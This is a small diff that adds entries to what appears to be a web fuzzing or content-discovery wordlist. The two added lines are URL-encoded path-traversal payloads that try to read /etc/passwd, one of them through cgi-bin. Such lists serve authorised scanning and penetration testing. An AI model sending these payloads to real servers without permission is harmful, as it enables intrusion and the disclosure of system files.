@@ -401,6 +401,7 @@ $searchForm
 -setup
 -vp18294
 -z
+.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ..;/
 .0
 .7z
@@ -133959,6 +133960,7 @@ cgi-bin-debug
 cgi-bin-live
 cgi-bin-old
 cgi-bin/
+cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 cgi-bin/ViewLog.asp
 cgi-bin/a1stats/a1disp.cgi
 cgi-bin/awstats.pl
